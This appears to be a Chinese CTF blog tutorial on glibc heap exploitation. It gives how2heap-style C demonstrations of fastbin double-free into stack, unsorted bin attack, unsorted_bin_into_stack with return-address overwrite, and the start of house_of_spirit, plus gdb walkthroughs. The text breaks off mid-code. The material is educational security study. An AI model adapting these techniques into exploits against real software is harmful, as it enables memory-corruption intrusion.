class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sections += &quot; args stack backtrace expressions&quot;</span></span><br><span class="line"><span class="comment">#spliter.show(&quot;legend&quot;, on=legend_on)</span></span><br><span class="line"><span class="comment">#spliter.show(&quot;stack&quot;, on=&quot;regs&quot;)</span></span><br><span class="line"><span class="comment">#spliter.show(&quot;backtrace&quot;, on=&quot;regs&quot;)</span></span><br><span class="line"><span class="comment">#spliter.show(&quot;args&quot;, on=&quot;regs&quot;)</span></span><br><span class="line"><span class="comment">#spliter.show(&quot;expressions&quot;, on=&quot;args&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.execute(&quot;set context-sections \&quot;%s\&quot;&quot; % sections)</span></span><br><span class="line"><span class="comment">#gdb.execute(&quot;set show-retaddr-reg on&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#spliter.build()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#end</span></span><br></pre></td></tr></table></figure></div>
<h1 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h1><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><ul>
<li>house_of_spirit<br><a class="link"   href="https://www.52pojie.cn/thread-1819636-1-1.html" >LCTF 2016 : PWN200 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, <span class="number">8</span>+(<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span></span><br><span class="line">		<span class="string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, d);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span></span><br><span class="line">		<span class="string">&quot;return a pointer to it.\n&quot;</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);</span><br><span class="line">	*d = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) (((<span class="type">char</span>*)&amp;stack_var) - <span class="built_in">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;4th malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>使用<code>ubuntu:16.04</code>进行编译</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_F7M2S7WM7URA2WQ.png"
                     
                ><br>使用<code>pwncli</code>改写<code>rpath</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YRQV6TQJYQWAXFV.png"
                     
                ><br>在malloc三次后， 0x400743处下断点<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_U8FQ8QMKCMJEEHE.png"
                     
                ><br>查看堆信息,三个fastbin的堆块，f1,f2,f3。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YBSW3KZB8CFB9PV.png"
                     
                ><br>在free(f1),free(f2),free(f1)后，在0x40083B下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XRP63QAXTP42DB4.png"
                     
                ><br>查看fastbinY信息。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_5PQAMT3K7NY6GSP.png"
                     
                ><br>0x20大小的fastbins链上形成了double free。<br>再次malloc两次后，设断点在0x40089F<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_B4MCXD5ETFVSG4E.png"
                     
                ><br>再次查看bins，因为申请两次后，fastbins中剩下f1(0x60300)，而0x60300指向0x603020没有改变，0x603020指向0x60300也没变，并且fastbins中的chunk标记为prev_inuse一直为1，所以fastbins中依然保留这个ABA结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7QJAPUB4DDD2PHB.png"
                     
                ><br>接下来，查看汇编代码，StackVar值改为0x20，为了放入0x20大小的fastbins,接下来把f1指向了StackVar以上0x8处，也就是prev_size的位置。将StackVar放入了0x20的fastbins中。在0x40092C处下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4PUYYFZPQXKV9KS.png"
                     
                ><br>查看堆信息。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_TMDXE86NU7SRWS3.png"
                     
                ><br>这时候在申请两次便可申请到栈上。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_WBDHQYTZ4AXN4ZB.png"
                     
                ><br>在0x40095c下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_D7WDB4DZ4DJS79F.png"
                     
                ><br>可以看到，已经申请到了栈上的值。</p>
<h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h2><p><code>glibc &lt; 2.29</code></p>
<h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">		   <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> *p=<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(p);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span></span><br><span class="line">		   <span class="string">&quot;point to %p\n&quot;</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">	p[<span class="number">1</span>]=(<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span></span><br><span class="line">		   <span class="string">&quot;rewritten:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="type">void</span>*)stack_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<pre><code>使用ubuntu:16.04进行编译，然后使用pwncli改写rpath。
</code></pre>
<h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><p>首先申请了两个堆块，第一个堆块不属于fastbin大小，先进入unsortedbin中，第二个堆块为了防止第一块堆块与topchunk合并。在free第一个堆块前设置断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_CHJZNE3YDAFDZMS.png"
                     
                ><br>查看bins和heap信息<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_CKURHWFQTKVYSZ4.png"
                     
                ><br>free第一个chunk以后，bins和heap信息，unsortedbin里的第一个chunk的fd和bk指向main_arena+0x58的位置。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_E396T5K2YSZR35Q.png"
                     
                ><br>接下来利用uaf将unsortedbin中的第一个chunk的bk指针（rax存储的指针指向fd,rax+8指向bk,bk指向后加入的chunk）指向StackVar的prev_size位置。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_UC93S5J8Q2CNP72.png"
                     
                ><br>在0x4007D9处下断点，查看heap和bins信息。可以看到，0x602000处的chunk的bk指针被改为了一个栈值，fd指向main_arena+0x58的位置。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922101848230.png"
                      alt="image-20230922101848230"
                ><br>再次将unsortedbin中第一个chunk给malloc出来以后，unsortedbin中仅剩StackVar-0x10。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_ZJY9Q5VVBT68CZ3.png"
                     
                ><br>在0x400828下断点。查看heap和bins信息。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_Z4EUWZVH32R7NCC.png"
                     
                ><br>可以看到，StackVar的fd指针即用户区域起始处已被修改为main_arena+0x58的值。</p>
<h2 id="unsorted-bin-into-stack"><a href="#unsorted-bin-into-stack" class="headerlink" title="unsorted_bin_into_stack"></a>unsorted_bin_into_stack</h2><p><code>glibc &lt; 2.29</code></p>
<h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">intptr_t</span> stack_buffer[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">	<span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Create a fake chunk on the stack&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Set size for next allocation and the bk pointer to any writable address&quot;</span>);</span><br><span class="line">	stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line">	stack_buffer[<span class="number">3</span>] = (<span class="type">intptr_t</span>)stack_buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);</span><br><span class="line">	victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line">	victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line">	<span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="number">2</span>]);</span><br><span class="line">	<span class="type">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">	<span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">	<span class="built_in">memcpy</span>((p2+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<pre><code>使用ubuntu16.04编译，然后使用pwncli改写rpath。
</code></pre>
<h3 id="调试-2"><a href="#调试-2" class="headerlink" title="调试"></a>调试</h3><p>首先申请两个堆块<br>第一次申请的0x100大小的堆块给了[rbp+ptr]。第二个0x100是阻断topchunk。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_SKW8ZP7TMRGT4KH.png"
                     
                ><br>接下来free(ptr)，把ptr放入unsorted bin中。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_M9SHEHDCSMPZBD7.png"
                     
                ><br>在0x4007A7其fd，bk指向main_arena+x58的位置。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2PFN7JA5YKTQ3WJ.png"
                     
                ><br>这里把var_28位置写为0x110。IDA里这个var_28中的0x28是16进制的偏移。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XUU37A7TTNM9CTE.png"
                     
                ><br>这里把rax指向ptr-8的位置，特就是size处。然后将其改为0x20。unsorted bin有FIFO特性，下次申请0x100大小不会找到它。然后将ptr+8的位置指向var_30，也就是把ptr的bk指针指向var_0x28+0x8的位置（bk指向后进入unsorted bin的chunk），var_0x28&#x3D;0x110，也就是伪造的chunk大小，var_30也就是prev_size的位置。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7FFXHQMZJZJ6VD9.png"
                     
                ><br>在0x40081C下断点，可见ptr的bk指向栈。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_X8QF98YVC2Y7HSR.png"
                     
                ><br>查看0x602410内存可见ptr的size位置被改为了0x20<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_RNY3WYAWYJ7DY93.png"
                     
                ><br>接下来申请0x100大小的chunk将会去unsorted bin寻找0x110大小的chunk，ptr已被改为0x20大小，所以跳过ptr申请到了栈上伪造的var_30处chunk。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4R6P2X9QDR3K5EQ.png"
                     
                ><br>在0x40082B处下断点，可见malloc后，unsorted被整理，0x20大小的ptr放进了small bin。fd和bk都指向main_arena+104处。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_CFQPP2ZXM4P7YKJ.png"
                     
                ><br>申请成功。</p>
<h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h2><h3 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a;</span><br><span class="line">	<span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((<span class="built_in">aligned</span> (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, <span class="built_in">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. 